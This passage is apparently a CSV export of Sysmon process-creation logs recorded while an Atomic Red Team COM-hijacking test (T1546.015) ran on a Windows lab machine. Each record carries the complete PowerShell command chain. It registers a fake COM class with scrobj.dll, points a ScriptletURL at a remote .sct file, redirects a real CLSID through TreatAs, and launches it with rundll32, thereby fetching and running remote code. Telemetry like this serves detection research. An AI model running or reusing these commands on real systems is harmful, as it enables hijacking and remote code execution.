      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-cb1e-658c-7002-000000000b00}</Data>
      <Data Name=""ParentProcessId"">1264</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /ve /T REG_SZ /d \""""C:\WINDOWS\system32\scrobj.dll\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /v \""""ThreadingModel\"""" /T REG_SZ /d \""""Apartment\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL\"""" /ve /T REG_SZ /d \""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f

reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f

rundll32.exe -sta \""""AtomicTest\""""}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\reg.exe"" add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Console Tool,,,,,,,1,9503,,10.0.22621.1 (WinBuild.160101.0800),"MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",C:\Windows\System32\reg.exe,,Medium,0x8000000000000000,4,{fda94052-3502-658d-b367-080000000000},0x867b3,0,reg.exe,"""powershell.exe"" & {reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /ve /T REG_SZ /d \""""C:\WINDOWS\system32\scrobj.dll\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /v \""""ThreadingModel\"""" /T REG_SZ /d \""""Apartment\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL\"""" /ve /T REG_SZ /d \""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f

reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f

rundll32.exe -sta \""""AtomicTest\""""}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-cb1e-658c-7002-000000000b00},1264,WINDEV2309EVAL\User,{fda94052-cb1f-658c-7e02-000000000b00},7044,1568,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-28T01:10:55.5674902Z,,,1,1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 01:10:55.566,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:55.5674902Z""/>
      <EventRecordID>9503</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:10:55.566</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb1f-658c-7e02-000000000b00}</Data>
      <Data Name=""ProcessId"">1568</Data>
      <Data Name=""Image"">C:\Windows\System32\reg.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Console Tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">reg.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\reg.exe"" add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-cb1e-658c-7002-000000000b00}</Data>
      <Data Name=""ParentProcessId"">1264</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /ve /T REG_SZ /d \""""C:\WINDOWS\system32\scrobj.dll\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /v \""""ThreadingModel\"""" /T REG_SZ /d \""""Apartment\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL\"""" /ve /T REG_SZ /d \""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f

reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f

rundll32.exe -sta \""""AtomicTest\""""}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\reg.exe"" add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E} /f",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Console Tool,,,,,,,1,9502,,10.0.22621.1 (WinBuild.160101.0800),"MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",C:\Windows\System32\reg.exe,,Medium,0x8000000000000000,4,{fda94052-3502-658d-b367-080000000000},0x867b3,0,reg.exe,"""powershell.exe"" & {reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /ve /T REG_SZ /d \""""C:\WINDOWS\system32\scrobj.dll\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /v \""""ThreadingModel\"""" /T REG_SZ /d \""""Apartment\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL\"""" /ve /T REG_SZ /d \""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f

reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f

rundll32.exe -sta \""""AtomicTest\""""}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-cb1e-658c-7002-000000000b00},1264,WINDEV2309EVAL\User,{fda94052-cb1f-658c-7d02-000000000b00},7044,9640,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-28T01:10:55.5568191Z,,,1,1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 01:10:55.555,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:55.5568191Z""/>
      <EventRecordID>9502</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:10:55.555</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb1f-658c-7d02-000000000b00}</Data>
      <Data Name=""ProcessId"">9640</Data>
      <Data Name=""Image"">C:\Windows\System32\reg.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Console Tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">reg.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\reg.exe"" add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E} /f</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-cb1e-658c-7002-000000000b00}</Data>
      <Data Name=""ParentProcessId"">1264</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /ve /T REG_SZ /d \""""C:\WINDOWS\system32\scrobj.dll\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /v \""""ThreadingModel\"""" /T REG_SZ /d \""""Apartment\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL\"""" /ve /T REG_SZ /d \""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f

reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f

rundll32.exe -sta \""""AtomicTest\""""}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
